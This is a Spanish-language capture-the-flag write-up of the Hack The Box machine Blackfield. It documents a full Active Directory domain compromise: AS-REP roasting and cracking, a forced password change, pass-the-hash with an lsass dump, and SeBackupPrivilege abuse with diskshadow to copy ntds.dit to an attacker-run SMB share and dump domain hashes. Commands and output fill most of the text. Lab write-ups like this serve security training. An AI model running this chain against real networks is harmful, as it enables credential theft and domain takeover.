---
tags:
title: Blackfield - Hard (HTB)
permalink: /Blackfield-HTB-Writeup
toc:
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,88,135,139,389,445,593,3268,5985,49678 10.129.229.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 01:43 -03
Nmap scan report for 10.129.229.17
Host is up (0.78s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-19 11:45:38Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   filtered netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49678/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-19T11:46:21
|_  start_date: N/A
|_clock-skew: 7h02m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.21 seconds
```

## SMB

```bash
 nxc smb 10.129.229.17 -u guest -p ''
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest: 
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/blackfield]
└─# impacket-smbclient 'blackfield.htb/guest'@10.129.229.17 -no-pass -dc-ip 10.129.229.17 -target-ip 10.129.229.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
forensic
IPC$
NETLOGON
profiles$
SYSVOL
# use forensic
ls
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# ls
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# ls
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use profiles$
ls
# ls
drw-rw-rw-          0  Wed Jun  3 13:47:12 2020 .
drw-rw-rw-          0  Wed Jun  3 13:47:12 2020 ..
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 AAlleni
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 ABarteski
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 ABekesz
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 ABenzies
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 ABiemiller
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 AChampken
drw-rw-rw-          0  Wed Jun  3 13:47:11 2020 ACheretei

```
### Kerberoasting

```bash
impacket-GetNPUsers  blackfield.local/guest -no-pass -request -usersfile users -dc-ip 10.129.229.17

<SNIP>
$krb5asrep$23$support@BLACKFIELD.LOCAL:440bc9dba3c9bca52e7f109e4caaf5eb$c587d293c17fe90f4f489f29fc1a50fd14a9757acae5b83e7343662c913ad13ca5e721bb4eeda0bfe9790f589e182a0c5220aa86120fdf5b700e23803e5df660dfd39fd96667beea843fe7b9536f9b84d611faf86ac7bfe2eda5b1d7e713b9835875f23b75edf7e451cc406ac589d6795b759d4998dd74713d1b960bbef5c63b1a6e19f9d8a58646807692e6367190e37333e352ca381d1af44fbd52ef5db05e87376d0c2eb366ec2a04061d6cb0a4db8d9f4eeec895f04affd53dad8b65eb3d24b22cc25ebb4e2f72bb179035262d23a32fb226e74b5e07d2dad42adba5f62caea446454a1eb81d1a7fd6145b298cbb342344ab
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

```

### Crack hash

```bash
john hash  --wordlist=/usr/share/wordlists/rockyou.txt               
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:10 DONE (2025-12-19 02:23) 0.09416g/s 1349Kp/s 1349Kc/s 1349KC/s #1WIF3Y.."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Shell as svc_backup

Con las credenciales que obtuve trate de recolectar todos los datos del dominio con `bloodhound-python`.

```bash
 bloodhound-python -ns 10.129.229.17 -u support -p '#00^BlackKnight' -d blackfield.local -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Testing resolved hostname connectivity dead:beef::b853:c7d1:27b4:a2bf
INFO: Trying LDAP connection to dead:beef::b853:c7d1:27b4:a2bf
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
<SNIP>
```
### Change password

Dentro veo que el usuario `support` tiene el privilegio `ForceChangePassword` contra el usuario `audit2020`, por lo que voy a usar el siguiente comando de `bloodyAD` para poder cambiarle la password a dicho usuario.

```bash
bloodyAD -d blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.229.17 set password audit2020 'zsln123!#'
[+] Password changed successfully!
```

Una vez hecho esto, me conecte a `smb` y es donde vi que tenia acceso al recurso compartido `forensics`, desde el cual no podía acceder como el usuario `guest` ni `support`.

### Lsass 

```bash
impacket-smbclient 'blackfield.htb/audit2020:zsln123!#'@10.129.229.17 -dc-ip 10.129.229.17 -target-ip 10.129.229.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use forensic
ls
# ls
drw-rw-rw-          0  Sun Feb 23 12:10:16 2020 .
drw-rw-rw-          0  Sun Feb 23 12:10:16 2020 ..
drw-rw-rw-          0  Sun Feb 23 15:14:37 2020 commands_output
drw-rw-rw-          0  Thu May 28 17:29:24 2020 memory_analysis
drw-rw-rw-          0  Fri Feb 28 19:30:34 2020 tools
# cd commands_output
# ls
drw-rw-rw-          0  Sun Feb 23 15:14:37 2020 .
drw-rw-rw-          0  Sun Feb 23 15:14:37 2020 ..
-rw-rw-rw-        528  Sun Feb 23 15:12:54 2020 domain_admins.txt
-rw-rw-rw-        962  Sun Feb 23 15:12:54 2020 domain_groups.txt
-rw-rw-rw-      16454  Fri Feb 28 19:32:17 2020 domain_users.txt
-rw-rw-rw-     518202  Sun Feb 23 15:12:54 2020 firewall_rules.txt
-rw-rw-rw-       1782  Sun Feb 23 15:12:54 2020 ipconfig.txt
-rw-rw-rw-       3842  Sun Feb 23 15:12:54 2020 netstat.txt
-rw-rw-rw-       3976  Sun Feb 23 15:12:54 2020 route.txt
-rw-rw-rw-       4550  Sun Feb 23 15:12:54 2020 systeminfo.txt
-rw-rw-rw-       9990  Sun Feb 23 15:12:54 2020 tasklist.txt
# cd ../memory_analysis
ls
# ls
drw-rw-rw-          0  Thu May 28 17:29:24 2020 .
drw-rw-rw-          0  Thu May 28 17:29:24 2020 ..
-rw-rw-rw-   37876530  Thu May 28 17:29:24 2020 conhost.zip
-rw-rw-rw-   24962333  Thu May 28 17:29:24 2020 ctfmon.zip
-rw-rw-rw-   23993305  Thu May 28 17:29:24 2020 dfsrs.zip
-rw-rw-rw-   18366396  Thu May 28 17:29:24 2020 dllhost.zip
-rw-rw-rw-    8810157  Thu May 28 17:29:24 2020 ismserv.zip
-rw-rw-rw-   41936098  Thu May 28 17:29:24 2020 lsass.zip
-rw-rw-rw-   64288607  Thu May 28 17:29:24 2020 mmc.zip
-rw-rw-rw-   13332174  Thu May 28 17:29:24 2020 RuntimeBroker.zip
-rw-rw-rw-  131983313  Thu May 28 17:29:24 2020 ServerManager.zip
-rw-rw-rw-   33141744  Thu May 28 17:29:24 2020 sihost.zip
-rw-rw-rw-   33756344  Thu May 28 17:29:24 2020 smartscreen.zip
-rw-rw-rw-   14408833  Thu May 28 17:29:24 2020 svchost.zip
-rw-rw-rw-   34631412  Thu May 28 17:29:24 2020 taskhostw.zip
-rw-rw-rw-   14255089  Thu May 28 17:29:24 2020 winlogon.zip
-rw-rw-rw-    4067425  Thu May 28 17:29:24 2020 wlms.zip
-rw-rw-rw-   18303252  Thu May 28 17:29:24 2020 WmiPrvSE.zip
# get lsass.zip
```

El único archivo que me llamo la atención es el `lsass.zip`, el cual cuando lo analizo veo que tiene un dumpeo de los secretos de `lsas` de la maquina.

```bash
7z l lsass.zip         

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2097152 bytes (2048 KiB)

Listing archive: lsass.zip

--
Path = lsass.zip
Type = zip
ERRORS:
Unexpected end of archive
Physical Size = 2097152
Characteristics = Local

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-23 11:02:02 .....    143044222     41935982  lsass.DMP
------------------- ----- ------------ ------------  ------------------------
2020-02-23 11:02:02          143044222     41935982  1 files

Errors: 1
```

Puedo usar [pypykatz](https://github.com/skelsec/pypykatz) que es la versión de Linux de `mimikatz`, por lo que puedo ver las credenciales que almacena, donde veo el hash NTLM del usuario `svc_backup`.

```bash
root@kali# pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP                          
FILE: ======== lsass.DMP =======                          
== LogonSession ==
authentication_id 406458 (633ba)                    
session_id 2
username svc_backup                        
domainname BLACKFIELD                               
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413  
luid 406458
        == MSV ==                          
                Username: svc_backup                      
                Domain: BLACKFIELD   
                LM: NA                              
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None                             
        == SSP [633ba]==             
                username                   
                domainname
                password None
        == Kerberos ==
                Username: svc_backup                      
                Domain: BLACKFIELD.LOCAL   
                Password: None                            
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None
                                                          
== LogonSession ==                                  
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server                                        
logon_time 2020-02-23T17:59:38.218491+00:00                                                                                                                                                                                                
sid S-1-5-96-0-2
<SNIP>
```
## Auth

Con el mismo me conecte al servicio `WinRM`.
```powershell
evil-winrm -i blackfield.local -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'                                                    
<SNIP>
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
3920bb317a0bef51027e2852be64b543
```

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
3920bb317a0bef51027e2852be64b543
```
## Shell as administrator

Viendo los privilegios veo que el `SeBackupPrivilege` esta habilitado, lo cual me permite guardan los registros de la `SAM`, `SYSTEM`, `SECURITY`, y además del archivo `NTDS`.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
### Copy

Para eso puedo usar el siguiente comando para poder obtener una copia de `sam`, y `system`.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\sam C:\programdata\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system C:\programdata\system
The operation completed successfully.
```

Y para transferirlos a mi maquina primero me cree un servidor `smb` compartido con el siguiente comando:

```bash
impacket-smbserver share $(pwd) -smb2support                                                                                                  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Y ya desde la maquina copio los archivos.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cp C:\programdata\system \\10.10.17.19\share
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cp C:\programdata\sam \\10.10.17.19\share
```
### Hash fail

Si uso `secretsdump` para dumpear los hashes veo el hash del usuario `administrator`.

```bash
impacket-secretsdump -sam sam -system system LOCAL 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Pero validando veo que son incorrectos, por lo que debe ser al hash del dominio, pero no del `DC (Domain Controller)`.

```bash
nxc winrm blackfield.local -u administrator -H '67ef902eae0d740df6257f273de75051'
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\administrator:67ef902eae0d740df6257f273de75051
```
### Script

Por lo que necesito obtener el `ntds.dit` también, para eso creo el siguiente archivo, el cual usando `diskshadow` me permite crear otra unidad logica copiando el disco `C:\`

```bash
cat zsln.txt 
set context persistent nowriters 
add volume c: alias zs1n 
create 
expose %zs1n% z: 
```
## Copy

El mismo lo transfiero a la maquina, y con `diskshadow` y el parámetro `/s` le paso el script.

```powershell
*Evil-WinRM* PS C:\Temp> diskshadow /s zsln.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  12/19/2025 6:59:08 AM

-> set context persistent nowriters
-> add volume c: alias zs1n
-> create
Alias zs1n for shadow ID {958cced4-1f97-425c-9ed7-617debec4b8d} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {a195cdc9-b679-45d5-b5f3-18a26100b167} set as environment variable.

Querying all shadow copies with the shadow copy set ID {a195cdc9-b679-45d5-b5f3-18a26100b167}

        * Shadow copy ID = {958cced4-1f97-425c-9ed7-617debec4b8d}               %zs1n%
                - Shadow copy set: {a195cdc9-b679-45d5-b5f3-18a26100b167}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 12/19/2025 6:59:09 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %zs1n% z:
-> %zs1n% = {958cced4-1f97-425c-9ed7-617debec4b8d}
The  drive letter is already in use.
```

Ahora puedo ver que efectivamente tengo acceso y puedo listar la nueva unidad que cree.

```powershell
*Evil-WinRM* PS C:\Temp> dir z:


    Directory: Z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-----       12/19/2025   6:42 AM                Temp
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt
```

Por lo que ahora con `robocopy` puedo copiar el archivo al directorio actual.

```powershell
*Evil-WinRM* PS C:\Temp> robocopy /b z:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, December 19, 2025 6:59:34 AM
   Source : z:\Windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\Windows\ntds\
            New File              18.0 m        ntds.dit
<SNIP>
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
<SNIP>
```
## Shell

Ya después de eso puedo pasarlo a mi maquina para poder repetir el mismo proceso con `secretsdump`, y es ahí donde veo el hash NTLM del usuario `administrator`, pero del `DC`

```bash
impacket-secretsdump -ntds ntds.dit -system system -sam sam LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
<SNIP>
```

```powershell
 evil-winrm -i blackfield.local -u administrator -H '184fb5e5178480be64824d4cd53b99ee'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
4375a629c7c67c8e29db269060c955cb
```

`~Happy Hacking.`